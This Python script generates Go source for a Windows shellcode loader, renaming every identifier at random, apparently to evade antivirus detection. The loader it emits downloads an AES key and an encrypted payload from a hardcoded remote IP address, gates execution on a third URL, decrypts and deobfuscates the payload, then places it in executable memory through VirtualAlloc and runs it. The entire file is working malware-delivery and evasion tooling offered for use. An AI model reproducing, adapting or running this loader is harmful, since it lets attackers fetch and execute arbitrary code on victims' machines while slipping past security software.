import random

#author: Lewis

exp = '''package main

import (
    "encoding/base64"
    "strings"
    "syscall"
    "time"
    "unsafe"
    "io/ioutil"
    "net/http"
    "net/url"
    "crypto/aes"
    "crypto/cipher"
)
var (
    {2}  = syscall.NewLazyDLL("kernel32.dll")
    {3} = {2}.NewProc("VirtualAlloc")
    {4} = {2}.NewProc("RtlMoveMemory")
    {31} = "http://107.148.201.2/1.txt"
)

func {5}({6} string){0}
    {19} := {29}()
    {20} := {21}({6}, {19})
    {7} :=strings.Replace({20}, "#", "A", -1 )
    {8} :=strings.Replace({7}, "!", "H", -1 )
    {9} :=strings.Replace({8}, "@", "1", -1 )
    {10} :=strings.Replace({9}, ")", "T", -1 )
    {11},_ := base64.StdEncoding.DecodeString({10}) 
    {12}, _, _ := {3}.Call(0, uintptr(len({11})), 0x1000|0x2000, 0x40)
    _, _, _ = {4}.Call({12}, (uintptr)(unsafe.Pointer(&{11}[0])), uintptr(len({11})))
    syscall.Syscall({12}, 0, 0, 0, 0)

{1}
func {21}({22} string, {19} string) string {0}
    {23}, _ := base64.StdEncoding.DecodeString({22})
    k := []byte({19})
    {24}, _ := aes.NewCipher(k)
    {24}Size := {24}.BlockSize()
    {24}Mode := cipher.NewCBCDecrypter({24}, k[:{24}Size])
    {25} := make([]byte, len({23}))
    {24}Mode.CryptBlocks({25}, {23})
    {25} = {26}({25})
    return string({25})
{1}


func {26}({25}Data []byte) []byte {0}
    {27} := len({25}Data)
    {28} := int({25}Data[{27}-1])
    return {25}Data[:({27} - {28})]
{1}
func {29}() string {0}
    time.Sleep(5 * time.Second)
    {30}, _ := http.Get({31} + "key.txt")
    defer {30}.Body.Close()
    body, _ := ioutil.ReadAll({30}.Body)
    return string(body)
{1}
func {33}() string {0}
    time.Sleep(5 * time.Second)
    {30}, _ := http.Get({31} + "168d49w84d9wd.txt")
    defer {30}.Body.Close()
    body, _ := ioutil.ReadAll({30}.Body)
    return string(body)
{1}
func main() {0}
    {14}, _ := url.Parse("http://107.148.201.2/k1.txt")
    {32} := {33}()
    {15} := {14}.Query()
    {14}.RawQuery = {15}.Encode()
    {16}, {18} := http.Get({14}.String())
    if {18} != nil {0}
        return
    {1}
    {13} := {16}.StatusCode
    {16}.Body.Close()
    if {18} != nil {0}
        return
    {1}
    var {17} int = 200
    if {13} == {17} {0}
    {5}({32})
    {1}
{1}'''


def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZqazwsxedcrfvtgbyhnujmikolp'
    return ''.join(random.sample(str,len))  
   
def build_AV():

    lef = '''{'''
    rig = '''}'''
    var1 = random_name(random.randint(3,9))
    var2 = random_name(random.randint(3,9))
    var3 = random_name(random.randint(3,9))
    fun1 = random_name(random.randint(3,9))
    var4 = random_name(random.randint(3,9))
    var5 = random_name(random.randint(3,9))
    var6 = random_name(random.randint(3,9))
    var7 = random_name(random.randint(3,9))
    var8 = random_name(random.randint(3,9))
    var9 = random_name(random.randint(3,9))
    var10 = random_name(random.randint(3,9))
    var11 = random_name(random.randint(3,9))
    var12 = random_name(random.randint(3,9))
    var13 = random_name(random.randint(3,9))
    var14 = random_name(random.randint(3,9))
    var15 = random_name(random.randint(3,9))
    var16 = random_name(random.randint(3,9))
    var17 = random_name(random.randint(3,9))
    var18 = random_name(random.randint(3,9))
    var19 = random_name(random.randint(3,9))
    var20 = random_name(random.randint(3,9))
    var21 = random_name(random.randint(3,9))
    var22 = random_name(random.randint(3,9))
    var23 = random_name(random.randint(3,9))
    var24 = random_name(random.randint(3,9))
    var25 = random_name(random.randint(3,9))
    var26 = random_name(random.randint(3,9))
    var27 = random_name(random.randint(3,9))
    var28 = random_name(random.randint(3,9))
    var29 = random_name(random.randint(3,9))
    var30 = random_name(random.randint(3,9))
    var31 = random_name(random.randint(3,9))


    shellc = exp.format(lef,rig,var1,var2,var3,fun1,var4,var5,var6,var7,var8,var9,var10,var11,var12,var13,var14,var15,var16,var17,var18,var19,var20,var21,var22,var23,var24,var25,var26,var27,var28,var29,var30,var31)
    return shellc


if __name__ == '__main__':
    print (build_AV())
 

